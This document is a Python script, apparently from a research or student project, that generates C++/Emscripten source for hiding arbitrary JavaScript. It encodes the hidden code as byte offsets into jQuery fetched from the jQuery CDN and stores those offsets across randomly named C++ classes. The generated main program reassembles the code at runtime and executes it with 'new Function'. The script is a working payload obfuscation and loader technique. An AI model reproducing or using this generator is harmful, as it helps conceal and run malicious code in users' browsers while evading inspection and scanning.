import glob
import os
import random
import string
from urllib.request import urlopen

from Phase13.src.utils import SafeDict, to_snake

PUBLIC_FUNC, PRIVATE_FUNC = range(2)

SAVE_DIR = os.getcwd()


class CppFunction:

    def __init__(self, name, prefix, params, content, privacy):
        self.name = name
        self.prefix = prefix
        self.params = params
        self.content = content
        self.privacy = privacy

    def h_line(self):
        prefix = "" if self.prefix == "" else self.prefix + " "
        return "%s%s(%s);" % (prefix, self.name, ", ".join(self.params))

    def c_func(self):
        prefix = "" if self.prefix == "" else self.prefix.replace("virtual ", "") + " "
        params = [p.split("=")[0] for p in self.params]
        return """%s{c_name}::%s(%s)
{{
    %s
}}
""" % (prefix, self.name, ", ".join(params), self.content)


class CppClass:

    def __init__(self, name, file_dir, functions=None, access_classes=None, members=None):
        if members is None:
            members = []
        if access_classes is None:
            access_classes = []

        self.name = name
        self.access_classes = access_classes
        self.file_name = to_snake(name)
        self.file_path_no_ext = os.path.join(file_dir, to_snake(name))
        self.functions = functions
        self.members = members

    def set_functions(self, functions):
        self.functions = functions

    def set_members(self, members):
        self.members = members

    def add_access_class(self, name):
        self.access_classes.append(name)

    def __h_file_header(self):
        access = ": " + ", ".join("public " + n for n in self.access_classes) if self.access_classes else ""
        includes = "\n".join('#include "%s.h"' % to_snake(n) for n in self.access_classes)

        return """#pragma once

%s

class %s %s
{{
    private:
        {pr_func}
    
    public:
        {pu_func}
}};
""" % (includes, self.name, access)

    def __c_file_header(self):
        return """#include "{file_name}.h"

{functions}
""".format_map(SafeDict(file_name=self.file_name))

    def __save_h_file(self):
        private_func = "\n\t\t".join("%s %s;" % (t, n) for t, n in self.members) + "\n" + \
            "\n\t\t".join([func.h_line() for func in self.functions if func.privacy == PRIVATE_FUNC])
        public_func = "\n\t\t".join([func.h_line() for func in self.functions if func.privacy == PUBLIC_FUNC])

        h_file = self.__h_file_header().format(pr_func=private_func, pu_func=public_func)
        f_path = self.file_path_no_ext + ".h"
        with open(f_path, "w") as f:
            f.write(h_file)

    def __save_c_file(self):
        funcs = "\n".join(func.c_func().format_map(SafeDict(c_name=self.name)) for func in self.functions)

        c_file = self.__c_file_header().format_map(SafeDict(functions=funcs))
        f_path = self.file_path_no_ext + ".cpp"
        with open(f_path, "w") as f:
            f.write(c_file)

    def save_code(self):
        self.__save_c_file()
        self.__save_h_file()


def get_random_classes(number):
    prefix = random.choice(string.ascii_uppercase) + "".join(random.choice(string.ascii_lowercase) for i in range(2))
    remain = ["%s_%d" % (prefix, i) for i in range(1, number + 1)]
    root = random.choice(remain)
    tree = {root: []}
    remain.remove(root)

    for i in range(number - 1):
        curr = random.choice(list(tree.keys()))
        conn = random.choice(remain)

        tree[curr].append(conn)
        tree[conn] = []

        remain.remove(conn)

    classes = {n: CppClass(n, SAVE_DIR) for n in tree}

    for node, children in tree.items():
        for child in children:
            classes[child].add_access_class(node)

    return classes[root], list(classes.values())


def set_functions_and_members_to_class(cls, chars_to_save):
    params = random.sample(string.ascii_lowercase, 2)

    constructor = CppFunction(cls.name, prefix="",
                              params=["int %s=%s" % (params[0], chars_to_save[0]),
                                      "int %s=%s" % (params[1], chars_to_save[1])],
                              content="this->%s = %s;\n\tthis->%s = %s;" % (params[0], params[0], params[1], params[1]),
                              privacy=PUBLIC_FUNC)

    get_data = CppFunction("run_opp", prefix="virtual int", params=[],
                           content="return this->%s;" % params[0], privacy=PUBLIC_FUNC)

    get_len = CppFunction("time", prefix="virtual int", params=[],
                          content="return this->%s;" % params[1], privacy=PUBLIC_FUNC)

    cls.set_functions([constructor, get_data, get_len])
    cls.set_members([("int", params[0]), ("int", params[1])])


def save_main(root, classes, classes_to_write):
    template_main = """#include <emscripten.h>
#include <string>
#include <iostream>
#include <sstream>
{includes}

using namespace std;

EM_JS(void, run_code, (const char* str), {{{{
    new Function(UTF8ToString(str))();
}}}});

EM_JS(char *, get_jquery, (), {{{{
    var request = new XMLHttpRequest();
    request.open('GET', 'https://code.jquery.com/jquery-3.4.1.min.js', false);  // `false` makes the request synchronous
    request.send(null);

    if (request.status === 200) {{{{
        var text = request.responseText;
        var lengthBytes = lengthBytesUTF8(text) + 1;
        var stringOnWasmHeap = _malloc(lengthBytes);
        stringToUTF8(text, stringOnWasmHeap, lengthBytes);
        return stringOnWasmHeap;
    }}}} else {{{{
        return null;
    }}}}
}}}});

int main() {{{{
    
    {root_n}** classes = new {root_n}*[{cls_num}];
    {classes}
    
    char* tmp = get_jquery();
    if (!tmp) return 1;
    string data(tmp);
    
    ostringstream oss("");
    for (int i = 0; i < {cls_num}; i++) {{{{
        oss << data.substr(classes[i]->run_opp(), classes[i]->time());
    }}}}
    
    run_code(oss.str().c_str());
    
    for (int i = 0; i < {cls_num}; i++) {{{{
        delete[] classes[i];
    }}}}
    
    delete[] classes;
    delete[] tmp;
    
    return 0;
}}}}
""".format_map(SafeDict(root_n=root.name, cls_num=str(len(classes_to_write))))

    template_cls_line = "classes[%d] = new %s();"
    classes_write = "\n\t".join(template_cls_line % (i, cls.name) for i, cls in enumerate(classes_to_write))

    template_include_line = "#include \"%s.h\""
    includes = "\n".join(template_include_line % cls.file_name for cls in classes)

    main_path = os.path.join(SAVE_DIR, "main.cpp")
    with open(main_path, "w") as f:
        f.write(template_main.format(classes=classes_write, includes=includes))


def create_class(table_indxes):
    set_table_indxes = set(table_indxes)
    root, classes = get_random_classes(len(set_table_indxes))

    classes_dict = {}

    for cls, ch in zip(classes, set_table_indxes):
        set_functions_and_members_to_class(cls, ch)
        cls.save_code()
        classes_dict[ch] = cls

    classes_in_main = [classes_dict[c] for c in table_indxes]
    save_main(root, classes, classes_in_main)


def create_indexes_table(message_path):
    with open(message_path, 'rb') as f:
        message = f.read()

    data = urlopen("https://code.jquery.com/jquery-3.4.1.min.js").read()

    tabel_idxs = []
    already_found = 0
    current_find = message
    while current_find != bytes(0):
        idx = data.find(current_find)
        if idx != -1:
            tabel_idxs.append((idx, len(current_find)))
            already_found += len(current_find)
            current_find = message[already_found:]
        else:
            current_find = current_find[:-1]

    if already_found != len(message):
        raise Exception("Couldn't find all chars")

    return tabel_idxs


def main():
    code_path = r"..\code\code.txt"

    indx_tables = create_indexes_table(code_path)
    create_class(indx_tables)


def clear_irrelevant_files():
    for file in glob.glob("*.cpp"):
        os.remove(file)
    for file in glob.glob("*.h"):
        os.remove(file)


if __name__ == "__main__":
    clear_irrelevant_files()
    main()
